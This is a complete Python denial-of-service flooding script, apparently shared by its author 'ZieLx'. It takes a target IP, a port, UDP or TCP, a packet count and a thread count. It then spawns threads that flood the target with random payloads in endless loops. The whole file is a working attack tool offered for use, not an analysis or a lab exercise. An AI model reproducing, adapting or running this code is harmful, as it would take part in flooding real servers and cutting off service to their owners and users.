#Author : ZieLx
import random
import socket
import threading
import time

print("""\033[1;31;40m


=====================================
 [!] TOOLS DDOS BY : ZieLx
 [^] LARI ADA KANG RENAME
 [*] DONT ABUSE YA SAYANK
=====================================

      	 | UDP | TCP | 
""")

ip = str(input("\033[94m IP TARGET \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPORT TAGET \033[1;31;40m====> : "))
choice = str(input(" \033[94mMETHODS \033[1;31;40m     ====> : "))
times = int(input(" \033[94mPACKETS \033[1;31;40m      ====> : "))
threads = int(input("\033[94m THREADS \033[1;31;40m    ====> : "))

def udp():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"ZIELX ATTACKING TO {ip} : {port}")
		except:
			print(f"ZIELX ATTACKING TO {ip} : {port}")

def tcp():
	data = random._urandom(102498)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f"ZIELX ATTACKING TO {ip} : {port}")
		except:
			s.close()
			print(f"ZIELX ATTACKING TO {ip} : {port}")


for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
